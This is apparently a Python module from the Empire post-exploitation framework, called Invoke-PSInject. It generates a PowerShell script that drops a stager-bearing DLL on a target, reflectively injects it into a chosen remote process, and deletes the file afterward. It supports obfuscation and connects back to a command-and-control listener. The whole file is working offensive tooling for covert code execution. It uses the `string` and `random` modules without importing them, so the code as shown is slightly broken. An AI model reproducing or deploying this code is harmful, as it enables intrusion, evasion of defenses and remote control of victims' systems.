from lib.common import helpers
import base64

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-PSInject',

            'Author': ['@harmj0y', '@sixdub', 'leechristensen (@tifkin_)', 'james fitts'],

            'Description': ("Utilizes Powershell to to inject a Stephen Fewer "
                            "formed ReflectivePick which executes PS code"
                            "from memory in a remote process"),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,
            
            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'http://sixdub.net'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UploadPath'  : {
                'Description'   :   'Path to drop dll (C:\Users\Administrator\Desktop).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ProcName' : {
                'Description'   :   'Process name to inject into. (I.E calc, chrome, powershell)',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Arch'  : {
                'Description'   :   'Architecture of the .dll to generate (x64 or x86).',
                'Required'      :   False,
                'Value'         :   'x64'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        def rand_text_alphanumeric(size=15, chars=string.ascii_uppercase + string.digits):
            return ''.join(random.choice(chars) for _ in range(size))

        fname = rand_text_alphanumeric() + ".dll"
        listenerName = self.options['Listener']['Value']
        procName = self.options['ProcName']['Value'].strip()
        uploadPath = self.options['UploadPath']['Value'].strip()
        arch = self.options['Arch']['Value'].strip()
        fullUploadPath = uploadPath + "\\" + fname

        if procName == '':
            print helpers.color("[!] ProcName must be specified.")
            return ''

        # staging options
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/management/Invoke-ReflectivePEInjection.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode
        scriptEnd = ""
        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            # not a valid listener, return nothing for the script
            print helpers.color("[!] Invalid listener: %s" %(listenerName))
            return ''
        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)

            if launcher == '':
                print helpers.color('[!] Error in launcher generation.')
                return ''
            else:
                launcherCode = launcher.split(' ')[-1]

                scriptEnd += "Invoke-ReflectivePEInjection -PEPath %s -ProcName %s " % (fullUploadPath, procName)

                dll = self.mainMenu.stagers.generate_dll(launcherCode, arch)

                UploadScript = self.mainMenu.stagers.generate_upload(dll, fullUploadPath)

                if obfuscate:
                    scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)

                script += "\r\n"
                script += UploadScript
                script += "\r\n"
                script += scriptEnd
                script += "\r\n"
                script += "Remove-Item -Path %s" % fullUploadPath

                return script
